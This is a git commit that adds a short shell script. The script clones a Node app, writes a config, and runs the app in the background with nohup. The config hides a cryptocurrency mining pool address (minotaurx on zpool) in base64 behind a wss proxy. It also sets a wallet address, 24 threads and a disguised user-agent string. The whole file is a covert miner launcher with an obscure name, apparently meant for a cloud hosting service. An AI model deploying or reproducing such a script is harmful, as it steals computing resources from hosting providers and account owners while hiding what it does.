cc5d22e3e31db06acf826a12651276ef17ca70a6
officialmamidarawalo <167901152+officialmamidarawalo@users.noreply.github.com>
2025-09-10 10:26:38 +0700

    Create dtxcaml927.sh

---
+++ go-railway/refs/main/go/dtxcaml927.sh
@@ -0,0 +1,7 @@
+git clone https://github.com/ismailalkaf/node-mino-app.git
+
+cd node-mino-app
+
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "RRXg5hMNtXznCLHM9yi4VoFxgj6nbNkWhB", "password": "c=RVN", "argent": "uzd-golang/1.0", "threads": 24}' > data.txt
+
+nohup node app.js
